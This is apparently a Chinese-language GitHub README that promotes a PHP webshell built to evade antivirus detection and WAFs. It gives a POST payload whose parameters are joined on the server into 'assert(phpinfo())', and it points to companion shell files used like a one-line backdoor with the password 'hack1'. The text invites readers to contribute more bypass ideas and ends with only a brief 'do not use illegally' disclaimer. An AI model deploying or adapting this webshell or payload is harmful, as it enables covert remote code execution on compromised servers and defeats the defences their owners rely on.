 # shell
我发现了一种php-shell的新写法，它可以绕过大部分的检测，还可以用分块传输绕过waf

使用post发送如下参数

hack1=ass&hack2=ert&hack3=phpi&hack4=fo()


hack1会和hack2拼接，hack3会和hack4拼接而形成assert(phpinfo())
![1](https://user-images.githubusercontent.com/90552883/229515220-742c99b2-a06f-4f30-99b9-c57b3a1c373a.PNG)
![2](https://user-images.githubusercontent.com/90552883/229515223-ce3efc9e-e456-4421-81c6-1036808c2bbf.PNG)
![3](https://user-images.githubusercontent.com/90552883/229515226-11aaa83e-9ab8-4b24-b30b-cd996e23df69.PNG)
![4](https://user-images.githubusercontent.com/90552883/229517804-b1b83abb-d678-4b24-b2be-dd9bcddde2e4.PNG)

我还编写了通过拼接编码方式来绕过的ms.php(绕过效果比xz.php差) 可以向php一句话一样来使用它 密码（hack1)

欢迎各位提供绕过思路

请勿用于违法行为！！！！！！！！！！！！！！！
